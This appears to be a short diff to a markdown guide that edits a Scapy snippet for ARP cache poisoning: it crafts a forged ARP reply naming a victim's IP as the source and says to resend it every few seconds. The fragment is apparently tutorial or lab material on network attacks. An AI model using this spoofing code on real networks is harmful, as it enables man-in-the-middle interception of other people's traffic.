@@ -327,7 +327,7 @@ send(packet)
 packet = ARP(op=2, pdst=target_ip, \
              hwdst=getmacbyip(target_ip), \
              psrc=victim_ip)
-send(packet, verbose)
+send(packet, verbose=False)
 ```
 - Repeat sending this every 4 or 5 seconds
 
